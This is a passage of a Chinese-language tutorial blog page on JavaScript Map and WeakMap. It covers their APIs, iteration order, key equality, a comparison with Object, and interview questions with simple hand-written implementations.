class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()<br></code></pre></td></tr></table></figure><p>Map 构造函数可以接受一个数组作为参数，数组成员是一个个表示键值对的数组</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> items = [<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;张三&#x27;</span>],<br>  [<span class="hljs-string">&#x27;title&#x27;</span>, <span class="hljs-string">&#x27;Author&#x27;</span>]<br>];<br><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br></code></pre></td></tr></table></figure><h3 id="Map-的核心特性"><a href="#Map-的核心特性" class="headerlink" title="Map 的核心特性"></a>Map 的核心特性</h3><p><strong>键的灵活性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-comment">// 支持任意类型作为键</span><br>map.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;number&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;string&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(&#123;<span class="hljs-attr">id</span>: <span class="hljs-number">1</span>&#125;, <span class="hljs-string">&#x27;object&#x27;</span>);<br>map.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;function&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-property">size</span>); <span class="hljs-comment">// 4</span><br></code></pre></td></tr></table></figure><p><strong>键值相等性判断</strong></p><p>Map 和 Set 一样使用 SameValueZero 算法：</p><ul><li>NaN 被视为相等</li><li>+0 和 -0 被视为相等</li><li>对象按引用比较</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;value&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;value&#x27;</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(&#123;&#125;)); <span class="hljs-comment">// undefined (不同引用)</span><br></code></pre></td></tr></table></figure><h3 id="Map-的基础-API详解"><a href="#Map-的基础-API详解" class="headerlink" title="Map 的基础 API详解"></a>Map 的基础 API详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new Map(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">map.set(key, value)</td><td align="left">添加&#x2F;更新键值对</td></tr><tr><td align="left">map.get(key)</td><td align="left">获取对应值</td></tr><tr><td align="left">map.has(key)</td><td align="left">检查键是否存在</td></tr><tr><td align="left">map.delete(key)</td><td align="left">删除键值对</td></tr><tr><td align="left">map.clear()</td><td align="left">清空集合</td></tr><tr><td align="left">map.size</td><td align="left">获取键值对的数量（非函数属性，不能 set.size()）</td></tr></tbody></table><h3 id="Map-的迭代操作"><a href="#Map-的迭代操作" class="headerlink" title="Map 的迭代操作"></a>Map 的迭代操作</h3><p>Map 结构原生提供三个遍历器生成函数和一个遍历方法</p><ul><li>map.values()：返回键值的遍历器</li><li>map.keys()：返回键名的遍历器</li><li>map.entries()：返回所有成员的遍历器</li><li>map.forEach()：遍历 Map 所有成员</li></ul><p>和 Set 一样，Map 的遍历顺序也是插入顺序，Map 的默认遍历器生成函数是它的 entries 方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>([<br>  [<span class="hljs-string">&#x27;name&#x27;</span>, <span class="hljs-string">&#x27;Alice&#x27;</span>],<br>  [<span class="hljs-string">&#x27;age&#x27;</span>, <span class="hljs-number">30</span>]<br>]);<br><br><span class="hljs-comment">// 1. for...of 遍历</span><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> [key, value] <span class="hljs-keyword">of</span> map) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;<br><br><span class="hljs-comment">// 2. forEach 遍历</span><br>map.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">value, key</span>) =&gt;</span> &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(key, value);<br>&#125;);<br><br><span class="hljs-comment">// 3. 获取迭代器</span><br><span class="hljs-keyword">const</span> keys = map.<span class="hljs-title function_">keys</span>();    <span class="hljs-comment">// 键迭代器</span><br><span class="hljs-keyword">const</span> values = map.<span class="hljs-title function_">values</span>();<span class="hljs-comment">// 值迭代器</span><br><span class="hljs-keyword">const</span> entries = map.<span class="hljs-title function_">entries</span>(); <span class="hljs-comment">// 键值对迭代器</span><br></code></pre></td></tr></table></figure><h3 id="Map-的高级特性与应用"><a href="#Map-的高级特性与应用" class="headerlink" title="Map 的高级特性与应用"></a>Map 的高级特性与应用</h3><p><strong>性能优势</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 与 Object 的性能对比</span><br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><span class="hljs-keyword">const</span> n = <span class="hljs-number">1000000</span>;<br><br><span class="hljs-comment">// 插入性能</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) obj[i] = i;<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object insert&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) map.<span class="hljs-title function_">set</span>(i, i);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map insert&#x27;</span>);<br><br><span class="hljs-comment">// 查找性能</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br>obj[n/<span class="hljs-number">2</span>];<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Object lookup&#x27;</span>);<br><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">time</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br>map.<span class="hljs-title function_">get</span>(n/<span class="hljs-number">2</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">timeEnd</span>(<span class="hljs-string">&#x27;Map lookup&#x27;</span>);<br></code></pre></td></tr></table></figure><p><strong>对象元数据存储</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 更优雅的元数据管理</span><br><span class="hljs-keyword">const</span> metadata = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">setMetadata</span>(<span class="hljs-params">obj, data</span>) &#123;<br>  metadata.<span class="hljs-title function_">set</span>(obj, data);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getMetadata</span>(<span class="hljs-params">obj</span>) &#123;<br>  <span class="hljs-keyword">return</span> metadata.<span class="hljs-title function_">get</span>(obj);<br>&#125;<br><br><span class="hljs-comment">// 避免直接修改对象属性</span><br></code></pre></td></tr></table></figure><h3 id="Map-与-Object-的对比"><a href="#Map-与-Object-的对比" class="headerlink" title="Map 与 Object 的对比"></a>Map 与 Object 的对比</h3><table><thead><tr><th align="left">特性</th><th align="left">Map</th><th align="left">Object</th></tr></thead><tbody><tr><td align="left">键类型</td><td align="left">任意值</td><td align="left">String&#x2F;Symbol</td></tr><tr><td align="left">键顺序</td><td align="left">插入顺序</td><td align="left">复杂规则(整数属性优先)</td></tr><tr><td align="left">size 属性</td><td align="left">直接获取</td><td align="left">需要手动计算</td></tr><tr><td align="left">迭代</td><td align="left">直接可迭代</td><td align="left">需要Object.keys()等转换</td></tr><tr><td align="left">性能</td><td align="left">频繁增删操作更优</td><td align="left">静态键值访问略快</td></tr><tr><td align="left">序列化</td><td align="left">需手动处理</td><td align="left">原生支持JSON序列化</td></tr><tr><td align="left">原型链污染</td><td align="left">完全隔离</td><td align="left">可能被污染</td></tr></tbody></table><h2 id="WeakMap"><a href="#WeakMap" class="headerlink" title="WeakMap"></a>WeakMap</h2><h3 id="WeakMap-的定义"><a href="#WeakMap-的定义" class="headerlink" title="WeakMap 的定义"></a>WeakMap 的定义</h3><p>WeakMap 和 Map 类似，也是用于生成键值对集合</p><h3 id="WeakMap-的核心特性"><a href="#WeakMap-的核心特性" class="headerlink" title="WeakMap 的核心特性"></a>WeakMap 的核心特性</h3><p><strong>弱引用键机制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> user = &#123; <span class="hljs-attr">id</span>: <span class="hljs-number">123</span> &#125;;<br><span class="hljs-keyword">const</span> weakmap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br>weakmap.<span class="hljs-title function_">set</span>(user, <span class="hljs-string">&#x27;user data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(weakmap.<span class="hljs-title function_">has</span>(user)); <span class="hljs-comment">// true</span><br><br><span class="hljs-comment">// 当对象失去所有强引用时</span><br>user = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 垃圾回收后自动移除条目</span><br><span class="hljs-comment">// weakmap.has(原user) 将返回 false</span><br></code></pre></td></tr></table></figure><p><strong>键类型限制</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><br><span class="hljs-comment">// 仅允许对象(null 除外)和 Symbol作为键</span><br>wm.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-function">() =&gt;</span> &#123;&#125;, <span class="hljs-string">&#x27;valid&#x27;</span>);<br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-title class_">Symbol</span>(), <span class="hljs-number">2</span>) <span class="hljs-comment">// 不报错</span><br><br><span class="hljs-comment">// 原始值会报错</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError: Invalid value used as weak map key</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-string">&#x27;key&#x27;</span>, <span class="hljs-string">&#x27;invalid&#x27;</span>); <span class="hljs-comment">// TypeError</span><br>wm.<span class="hljs-title function_">set</span>(<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>) <span class="hljs-comment">// TypeError</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-的-API-详解"><a href="#WeakMap-的-API-详解" class="headerlink" title="WeakMap 的 API 详解"></a>WeakMap 的 API 详解</h3><table><thead><tr><th align="left">方法&#x2F;属性</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">new WeakMap(iterable)</td><td align="left">构造函数</td></tr><tr><td align="left">weakMap.set(key, value)</td><td align="left">添加&#x2F;更新键值对</td></tr><tr><td align="left">weakMap.get(key)</td><td align="left">获取对应值</td></tr><tr><td align="left">weakMap.has(key)</td><td align="left">检查键是否存在</td></tr><tr><td align="left">weakMap.delete(key)</td><td align="left">删除键值对</td></tr></tbody></table><p>weakMap 没有 size 属性，不可遍历（即没有keys()、values()和entries()方法），因为成员都是弱引用，随时都可能消失。WeakMap 也没有 clear() 方法</p><h3 id="WeakMap-的特殊行为与边界情况"><a href="#WeakMap-的特殊行为与边界情况" class="headerlink" title="WeakMap 的特殊行为与边界情况"></a>WeakMap 的特殊行为与边界情况</h3><p><strong>键不可枚举</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> wm = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br><span class="hljs-keyword">const</span> key = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(key, <span class="hljs-string">&#x27;secret&#x27;</span>);<br><br><span class="hljs-comment">// 无法通过反射获取键</span><br><span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertySymbols</span>(key); <span class="hljs-comment">// []</span><br><span class="hljs-title class_">Reflect</span>.<span class="hljs-title function_">ownKeys</span>(key);             <span class="hljs-comment">// []</span><br></code></pre></td></tr></table></figure><p><strong>垃圾回收不确定性</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">let</span> obj = &#123;&#125;;<br>wm.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br>obj = <span class="hljs-literal">null</span>;<br><br><span class="hljs-comment">// 无法预测何时条目会被移除</span><br><span class="hljs-comment">// 依赖垃圾回收器运行</span><br></code></pre></td></tr></table></figure><p><strong>不可克隆</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 无法正确克隆WeakMap</span><br><span class="hljs-keyword">const</span> wm1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>();<br>wm1.<span class="hljs-title function_">set</span>(&#123;&#125;, <span class="hljs-string">&#x27;value&#x27;</span>);<br><br><span class="hljs-keyword">const</span> wm2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WeakMap</span>(wm1); <span class="hljs-comment">// 无效！</span><br><span class="hljs-comment">// 没有方法可以复制现有WeakMap的内容</span><br></code></pre></td></tr></table></figure><h3 id="WeakMap-和相关数据结构的区别"><a href="#WeakMap-和相关数据结构的区别" class="headerlink" title="WeakMap 和相关数据结构的区别"></a>WeakMap 和相关数据结构的区别</h3><table><thead><tr><th align="left">特性</th><th align="left">WeakMap</th><th align="left">Map</th><th align="left">WeakSet</th></tr></thead><tbody><tr><td align="left">键类型</td><td align="left">仅对象</td><td align="left">任意值</td><td align="left">仅对象</td></tr><tr><td align="left">值类型</td><td align="left">任意值</td><td align="left">任意值</td><td align="left">无值（仅存储键）</td></tr><tr><td align="left">可枚举性</td><td align="left">不可枚举</td><td align="left">可枚举</td><td align="left">不可枚举</td></tr><tr><td align="left">内存管理</td><td align="left">弱引用键</td><td align="left">强引用键值</td><td align="left">弱引用键</td></tr><tr><td align="left">使用场景</td><td align="left">私有数据&#x2F;元数据存储</td><td align="left">通用键值存储</td><td align="left">对象存在性检查</td></tr></tbody></table><h2 id="面试常见问题-6"><a href="#面试常见问题-6" class="headerlink" title="面试常见问题"></a>面试常见问题</h2><p><strong>Q：请解释 Map 和 Object 的主要区别是什么？</strong></p><ul><li>键类型不同：Map 键可以是任意类型，Object 键只能是字符串或 Symbol 值</li><li>顺序保证：Map 严格按照插入顺序迭代，Object 则是数字键升序排序后其他按插入顺序</li><li>大小获取：Map 可以直接用 size 属性，Object 则需要 Object.keys(obj).length</li><li>性能：Map 增删改查操作更高效</li><li>序列化：Map 需要手动转为数组，Object 直接支持 JSON.stringify</li></ul><p><strong>Q：WeakMap 和 Map 的核心区别是什么？为什么要有 WeakMap？</strong></p><p>核心区别：</p><ul><li>键类型：Map 键可以是任意类型，WeakMap 键只能是对象和 Symbol</li><li>内存管理：WeakMap 键是弱引用，不阻止 GC 垃圾回收，Map 键是强引用</li><li>可访问性：WeakMap 不可遍历，Map 可以遍历所有键值</li></ul><p>为什么要有 WeakMap？</p><ul><li>防止内存泄露：当键对象不再使用时自动清除关联值</li><li>私有数据存储：实现真正无法外部访问的私有属性</li></ul><p><strong>Q：为什么 WeakMap 的键必须是对象？</strong></p><p>主要基于两个核心设计目标：</p><ul><li>内存管理：只有对象存在垃圾回收机制，原始值（字符串、数字等）在 JavaScript 中永生；弱引用机制仅对需要回收的对象有意义</li><li>技术实现限制：引擎底层通过对象指针实现弱引用，弱允许原始值会破坏弱引用设计初衷，导致永久占用内存</li></ul><p><strong>Q：Set 如何保证元素的唯一性？</strong></p><p>通过 SameValueZero 算法和底层哈希表现（插入时先计算哈希值定位桶，桶内遍历采用 SameValueZero 算法精确比对，存在相同值则覆盖，否则新增）</p><p><strong>Q：WeakSet 为什么没有 size 属性和遍历方法？</strong></p><p>弱引用设计约束：成员对象都是弱引用，随时可能被回收，计算 size 可能会得到非确定的结果，同样，遍历结果也不可靠</p><p><strong>Q：为什么 Map 要保持插入顺序而 Object 不保证？</strong></p><ul><li>设计目标差异：Map 是专门设计的键值集合，顺序是其核心特新要求，Object 不是</li><li>历史兼容性：Object 的乱序行为是历史包袱，Map 没有历史包袱，直接规范顺序保证</li><li>性能取舍：Map 用额外链表维护顺序（空间换时间），Object 为优化访问速度牺牲顺序</li></ul><p><strong>Q：WeakSet 在垃圾回收时的行为是怎样的？</strong></p><ul><li>自动清理：当 WeakSet 中的成员失去引用时，GC 垃圾回收器会将该对象从 WeakSet 中移除</li><li>不可观测性：无法直接观测到回收时机</li><li>内存影响：不会阻止其键对象被回收</li></ul><p><strong>Q: 如何用 Object 模拟实现一个 Map？</strong></p><p>核心实现思路：</p><p>（1）用 Symbol 保证唯一性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> _keys = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;keys&#x27;</span>);<br><span class="hljs-keyword">const</span> _values = <span class="hljs-title class_">Symbol</span>(<span class="hljs-string">&#x27;values&#x27;</span>);<br></code></pre></td></tr></table></figure><p>（2）基本结构</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys] = [];   <span class="hljs-comment">// 存储键</span><br>    <span class="hljs-variable language_">this</span>[_values] = []; <span class="hljs-comment">// 存储值</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>（3）关键方法实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">if</span> (index === -<span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">push</span>(key);<br>    <span class="hljs-variable language_">this</span>[_values].<span class="hljs-title function_">push</span>(value);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable language_">this</span>[_values][index] = value;<br>  &#125;<br>&#125;<br><br><span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>  <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>[_keys].<span class="hljs-title function_">indexOf</span>(key);<br>  <span class="hljs-keyword">return</span> index !== -<span class="hljs-number">1</span> ? <span class="hljs-variable language_">this</span>[_values][index] : <span class="hljs-literal">undefined</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>Q: 请手写一个简化版的 WeakMap（不考虑弱引用）</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleWeakMap</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> = <span class="hljs-string">`weakmap@<span class="hljs-subst">$&#123;<span class="hljs-built_in">Date</span>.now()&#125;</span>`</span>; <span class="hljs-comment">// 唯一标识符</span><br>  &#125;<br><br>  <span class="hljs-title function_">set</span>(<span class="hljs-params">key, value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> key !== <span class="hljs-string">&#x27;object&#x27;</span> || key === <span class="hljs-literal">null</span>) &#123;<br>      <span class="hljs-keyword">throw</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">&#x27;Invalid key type&#x27;</span>);<br>    &#125;<br>    key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>] = value; <span class="hljs-comment">// 直接存储到对象上</span><br>  &#125;<br><br>  <span class="hljs-title function_">get</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> key?.[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span> <span class="hljs-keyword">in</span> key;<br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">key</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(key)) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">delete</span> key[<span class="hljs-variable language_">this</span>.<span class="hljs-property">_id</span>];<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-comment">// 使用示例</span><br><span class="hljs-keyword">const</span> map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleWeakMap</span>();<br><span class="hljs-keyword">const</span> obj = &#123;&#125;;<br>map.<span class="hljs-title function_">set</span>(obj, <span class="hljs-string">&#x27;data&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">get</span>(obj)); <span class="hljs-comment">// &#x27;data&#x27;</span><br>map.<span class="hljs-title function_">delete</span>(obj);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(map.<span class="hljs-title function_">has</span>(obj)); <span class="hljs-comment">// false</span><br></code></pre></td></tr></table></figure><p><strong>Q: 如何用数组实现 Set 的基本功能？</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ArraySet</span> &#123;<br>  <span class="hljs-title function_">constructor</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span> = [];<br>  &#125;<br><br>  <span class="hljs-title function_">add</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">has</span>(value)) &#123;<br>      <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">push</span>(value);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>;<br>  &#125;<br><br>  <span class="hljs-title function_">has</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">includes</span>(value); <span class="hljs-comment">// 或 indexOf(value) !== -1</span><br>  &#125;<br><br>  <span class="hljs-title function_">delete</span>(<span class="hljs-params">value</span>) &#123;<br>    <span class="hljs-keyword">const</span> index = <span class="hljs-variable language_">this</span>.<span class="hljs-property">_items</span>.<span class="hljs-title function_">indexOf</span>(value);<br>    <span class="hljs-keyword">if</span> (index &gt; -<span class="hljs-number">1</span>) &#123;<br>      <span class="hljs-variable 